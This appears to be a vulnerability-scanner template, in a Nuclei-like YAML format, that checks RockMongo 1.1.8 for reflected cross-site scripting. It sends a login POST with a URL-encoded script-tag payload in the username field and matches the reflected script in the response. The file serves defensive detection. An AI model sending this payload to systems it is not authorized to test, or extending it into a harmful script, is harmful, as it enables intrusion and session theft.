id: rockmongo-xss
brief:
    title: RockMongo 1.1.8 - Cross-Site Scripting
    by: pikpikcu
    level: high
    about: RockMongo 1.1.8 contains a cross-site scripting vulnerability which allows attackers to inject arbitrary JavaScript into the response returned by the application.
    label:
        - rockmongo
        - xss
        - packetstorm
        - vuln
    score: CVSS:7.2
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/index.php?action=login.index'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: more=0&host=0&username=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&password=&db=&lang=en_us&expire=3
      signs:
        - "on": word
          has:
            - '"><script>alert(document.domain)</script>'
          in: body
          need: all
        - "on": status
          status:
            - 200
        - "on": word
          has:
            - 'Content-Type: text/html'
          in: header
          need: all
